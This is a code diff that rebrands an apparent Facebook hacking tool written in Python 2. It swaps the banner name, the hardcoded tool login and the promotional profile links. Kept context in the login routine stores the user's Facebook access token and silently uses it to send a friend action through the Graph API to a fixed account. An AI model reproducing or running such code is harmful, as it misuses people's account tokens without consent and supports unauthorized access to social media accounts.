@@ -213,10 +213,10 @@ print  """
 \033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mHuntter\033[1;95m-_-_-_-_-_-_-_-_-»
 \033[1;92mNote1: Enter Tool usernam and Password 
 \033[1;92mNote2: This Tool is only for Bangladesh
-\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mRh king\033[1;95m-_-_-_-_-_-_-_-_-»
+\033[1;95m«-_-_-_-_-_-_-_-_-\033[1;91mHunter-baba\033[1;95m-_-_-_-_-_-_-_-_-»
  """
-CorrectUsername = "Rh"
-CorrectPassword = "king"
+CorrectUsername = "THCB"
+CorrectPassword = "THCB"
 
 loop = 'true'
 while (loop == 'true'):
@@ -232,7 +232,7 @@ while (loop == 'true'):
             os.system('xdg-open https://www.facebook.com/profile.php?id=100028650051426')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://www.facebook.com/profile.php?id=100040939292588')
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100028650051426')
 
 ##### LICENSE #####
 #=================#
@@ -306,7 +306,7 @@ def login1():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;95mLogin Successful•'
-				os.system('xdg-open https://youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
+				os.system('xdg-open https://www.facebook.com/profile.php?id=100028650051426')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
